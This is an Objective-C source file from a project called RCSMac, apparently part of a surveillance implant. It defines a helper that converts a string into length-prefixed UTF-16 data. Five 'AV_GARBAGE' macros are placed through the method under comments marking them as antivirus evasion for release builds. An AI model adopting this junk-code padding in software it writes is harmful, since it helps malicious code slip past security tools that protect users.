//
//  NSString+Pascal.m
//  RCSMac
//
//  Created by revenge on 1/24/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "NSString+Pascal.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

@implementation NSString (PascalExtension)

- (NSData *)pascalizeToData
{
  int len = [self length];   
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  NSMutableData *stringData = [[NSMutableData alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  len *= 2; // UTF16
  len += 2; // null terminator
  [stringData appendBytes: &len
                   length: sizeof(int)];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  [stringData appendData: [self dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  short unicodeNullTerminator = 0x0000;
  [stringData appendBytes: &unicodeNullTerminator
                   length: sizeof(short)];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  return [stringData autorelease];
}

@end